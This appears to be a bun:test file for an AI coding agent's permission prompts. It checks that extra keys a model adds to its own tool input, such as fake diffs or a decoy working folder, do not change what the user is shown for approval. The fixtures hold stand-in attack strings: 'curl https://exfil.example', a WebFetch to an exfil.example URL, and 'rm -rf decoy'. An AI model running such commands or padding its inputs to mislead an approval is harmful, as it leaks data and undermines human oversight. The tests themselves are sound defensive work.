// An owned ask whose request carries no `metadata.files`, from a call whose input carries a `files` array the model wrote
// (the recorded input keeps keys the tool schema drops). The approval describes the request and invents no diffs.
import { describe, expect, test } from "bun:test"
import { tmpdir } from "../fixture/tmpdir"
import { delivered, permissionAsked, startWire, succeeded, toolCalled, toolStarted } from "./wire-fixture"

const fake = (name: string) => `--- ${name}\n+++ ${name}\n@@ -1,1 +1,1 @@\n-# Title\n+# Title (typo fixed)\n`
const files = [
  { file: "README.md", patch: fake("README.md") },
  { file: "docs.md", patch: fake("docs.md") },
]
const rows = [
  {
    tool: "Read",
    input: { file_path: "notes.txt" },
    action: "Read",
    resources: ["notes.txt"],
    metadata: {},
    expect: "notes.txt",
  },
  { tool: "Grep", input: { pattern: "needle" }, action: "Grep", resources: ["needle"], metadata: {}, expect: "needle" },
  { tool: "Glob", input: { pattern: "src/**" }, action: "Glob", resources: ["src/**"], metadata: {}, expect: "src/**" },
  {
    tool: "WebFetch",
    input: { url: "https://exfil.example/c?d=1" },
    action: "WebFetch",
    resources: ["https://exfil.example/c?d=1"],
    metadata: { url: "https://exfil.example/c?d=1", format: "markdown" },
    expect: "exfil.example",
  },
  { tool: "WebSearch", input: { query: "q" }, action: "WebSearch", resources: ["q"], metadata: {}, expect: "q" },
  {
    tool: "Bash",
    input: { command: "curl https://exfil.example" },
    action: "Bash",
    resources: ["curl https://exfil.example"],
    metadata: { command: "curl https://exfil.example" },
    expect: "curl",
  },
  {
    tool: "Agent",
    input: { agent: "general", prompt: "p", description: "d" },
    action: "Agent",
    resources: ["general"],
    metadata: {},
    expect: "",
  },
]

async function approval(row: {
  tool: string
  input: Record<string, unknown>
  action: string
  resources: string[]
  metadata: Record<string, unknown>
}) {
  await using dir = await tmpdir()
  await using acp = await startWire({
    onPrompt: ({ sessionID, id }) => [
      delivered(sessionID, id),
      toolStarted(sessionID, "call_x", row.tool),
      toolCalled(sessionID, "call_x", row.input),
      permissionAsked(sessionID, "perm_x", {
        action: row.action,
        resources: row.resources,
        metadata: row.metadata,
        source: { type: "tool", messageID: "msg_x", id: "call_x" },
      }),
    ],
    onPermissionReply: ({ sessionID }) => [succeeded(sessionID)],
    permission: () => ({ outcome: { outcome: "selected", optionId: "reject" } }) as const,
  })
  await acp.initialize()
  const session = await acp.newSession(dir.path)
  await acp.prompt(session.sessionId, "hello")
  return { call: acp.permissions[0]?.toolCall, cwd: dir.path }
}

// Keys a model can add to its own input. Each tool's row adds every one it does not use itself.
const decoys: Record<string, unknown> = {
  query: "decoy query",
  cwd: "C:/decoy-folder",
  cmd: "rm -rf decoy",
  method: "POST",
  files,
  diff: fake("decoy.md"),
  title: "decoy title",
  url: "https://decoy.example/",
  command: "decoy command",
  path: "decoy/path.txt",
  file_path: "decoy/file.txt",
  notebook_path: "decoy/book.ipynb",
  filePath: "decoy/camel.txt",
  resources: ["decoy/resource.txt"],
  metadata: { url: "https://decoy.example/meta" },
}
const tools = [
  { tool: "Read", input: { file_path: "notes.txt" }, action: "Read", resources: ["notes.txt"], metadata: {} },
  {
    tool: "Edit",
    input: { file_path: "a.txt", old_string: "x", new_string: "y" },
    action: "Edit",
    resources: ["a.txt"],
    metadata: {},
  },
  { tool: "Write", input: { file_path: "w.txt", content: "c" }, action: "Edit", resources: ["w.txt"], metadata: {} },
  {
    tool: "NotebookEdit",
    input: { notebook_path: "n.ipynb", source: "s" },
    action: "Edit",
    resources: ["n.ipynb"],
    metadata: {},
  },
  {
    tool: "LSP",
    input: { action: "hover", path: "a.ts", line: 1, character: 1 },
    action: "Read",
    resources: ["a.ts"],
    metadata: {},
  },
  { tool: "Glob", input: { pattern: "src/**", path: "src" }, action: "Glob", resources: ["src/**"], metadata: {} },
  { tool: "Grep", input: { pattern: "needle", path: "src" }, action: "Grep", resources: ["needle"], metadata: {} },
  { tool: "Bash", input: { command: "sh setup.sh" }, action: "Bash", resources: ["sh setup.sh"], metadata: {} },
  {
    tool: "PowerShell",
    input: { command: "Get-ChildItem" },
    action: "Bash",
    resources: ["Get-ChildItem"],
    metadata: {},
  },
  {
    tool: "WebFetch",
    input: { url: "https://ok.example/doc" },
    action: "WebFetch",
    resources: ["https://ok.example/doc"],
    metadata: { url: "https://ok.example/doc", format: "markdown" },
  },
  { tool: "WebSearch", input: { query: "q" }, action: "WebSearch", resources: ["q"], metadata: {} },
  {
    tool: "Agent",
    input: { agent: "general", prompt: "p", description: "d" },
    action: "Agent",
    resources: ["general"],
    metadata: {},
  },
  { tool: "Skill", input: { id: "deploy" }, action: "Skill", resources: ["deploy"], metadata: {} },
  {
    tool: "slack_post_message",
    input: { channel: "#public", text: "hi" },
    action: "slack_post_message",
    resources: ["*"],
    metadata: {},
  },
]

describe("keys a tool does not declare, added by the model to its own input, change nothing in the approval", () => {
  for (const row of tools)
    test(row.tool, async () => {
      const added = Object.fromEntries(Object.entries(decoys).filter(([key]) => !(key in row.input)))
      const plain = await approval(row)
      const decoyed = await approval({ ...row, input: { ...row.input, ...added } })
      const shown = (result: typeof plain) => ({
        title: result.call?.title,
        kind: result.call?.kind,
        locations: (result.call?.locations ?? []).map((item) => item.path.replace(result.cwd, "<cwd>")),
        content: (result.call?.content ?? []).map((item) =>
          "path" in item ? { ...item, path: item.path.replace(result.cwd, "<cwd>") } : item,
        ),
      })
      expect(shown(decoyed)).toEqual(shown(plain))
    })

  test("a Bash call with a model-added cwd is shown in the folder it runs in", async () => {
    const result = await approval({
      tool: "Bash",
      input: { command: "sh setup.sh", cwd: "C:/decoy-folder", cmd: "rm -rf decoy" },
      action: "Bash",
      resources: ["sh setup.sh"],
      metadata: {},
    })
    expect(result.call?.title).toBe("sh setup.sh")
    expect(result.call?.locations).toEqual([{ path: result.cwd }])
    expect(result.call?.rawInput).toEqual({ command: "sh setup.sh", cwd: result.cwd })
  })

  test("an LSP workspace search keeps its query, a field the tool declares", async () => {
    const row = {
      tool: "LSP",
      input: { action: "workspace_symbols", path: "a.ts", query: "Widget" },
      action: "Read",
      resources: ["a.ts"],
      metadata: {},
    }
    expect((await approval(row)).call?.rawInput).toMatchObject({ query: "Widget" })
  })

  test("a WebFetch with a model-added method keeps the method its request names", async () => {
    const result = await approval({
      tool: "WebFetch",
      input: { url: "https://ok.example/doc", method: "POST" },
      action: "WebFetch",
      resources: ["https://ok.example/doc"],
      metadata: { url: "https://ok.example/doc", format: "markdown" },
    })
    expect(result.call?.title).toBe("https://ok.example/doc")
  })

  // A tool with no declared fields in the table keeps its arguments, which the prompt shows only as the raw input.
  test.each([
    ["an MCP tool", "slack_post_message", { channel: "#public", text: "hi" }],
    ["a Skill", "Skill", { id: "deploy" }],
  ])("%s shows the arguments it sends", async (_, tool, input) => {
    const result = await approval({ tool, input, action: tool, resources: ["*"], metadata: {} })
    expect(result.call?.rawInput).toEqual(input)
  })
})

describe("an owned ask with a model-written files field", () => {
  for (const row of rows)
    test(row.tool, async () => {
      await using dir = await tmpdir()
      await using acp = await startWire({
        onPrompt: ({ sessionID, id }) => [
          delivered(sessionID, id),
          toolStarted(sessionID, "call_x", row.tool),
          toolCalled(sessionID, "call_x", { ...row.input, files }),
          permissionAsked(sessionID, "perm_x", {
            action: row.action,
            resources: row.resources,
            metadata: row.metadata,
            source: { type: "tool", messageID: "msg_x", id: "call_x" },
          }),
        ],
        onPermissionReply: ({ sessionID }) => [succeeded(sessionID)],
        permission: () => ({ outcome: { outcome: "selected", optionId: "reject" } }) as const,
      })
      await acp.initialize()
      const session = await acp.newSession(dir.path)
      await acp.prompt(session.sessionId, "hello")
      const call = acp.permissions[0]?.toolCall
      expect(call?.content ?? []).toHaveLength(0)
      expect(String(call?.title)).toContain(row.expect)
    })
})
